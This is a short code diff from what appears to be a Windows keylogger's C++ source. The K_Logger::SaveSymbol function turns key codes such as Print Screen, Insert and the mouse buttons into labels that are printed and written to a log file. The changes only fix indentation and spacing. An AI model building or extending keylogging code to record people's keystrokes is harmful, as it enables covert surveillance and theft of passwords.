@@ -701,10 +701,10 @@ int K_Logger::SaveSymbol(WORD iKey)
 		WriteToDoc("  *Left_ALT*  ");
 		break;
 
-		case VK_SNAPSHOT:
-			cout << "  *PRINT_SCREEN*  ";
-			WriteToDoc("  *PRINT_SCREEN*  ");
-			break;
+	case VK_SNAPSHOT:
+		cout << "  *PRINT_SCREEN*  ";
+		WriteToDoc("  *PRINT_SCREEN*  ");
+		break;
 
 	case VK_CAPITAL:
 		cout << "  *CAPS_LOCK*  ";
@@ -771,10 +771,10 @@ int K_Logger::SaveSymbol(WORD iKey)
 		WriteToDoc(" btn_ctrl ");
 		break;
 
-		case VK_INSERT:
-			cout << " Insert ";
-			WriteToDoc(" Insert ");
-			break;
+	case VK_INSERT:
+		cout << " Insert ";
+		WriteToDoc(" Insert ");
+		break;
 
 	case VK_DELETE:
 		cout << " *Delete* ";
@@ -783,13 +783,13 @@ int K_Logger::SaveSymbol(WORD iKey)
 
 
 	case VK_RBUTTON:
-		cout << "*mouse_right*";
-		WriteToDoc("*mouse_right*");
+		cout << " *mouse_right *";
+		WriteToDoc(" *mouse_right* ");
 		break;
 
 	case VK_LBUTTON:
-		cout << "*mouse_left*";
-		WriteToDoc("*mouse_left*");
+		cout << " *mouse_left* ";
+		WriteToDoc(" *mouse_left* ");
 		break;
 
 	default:
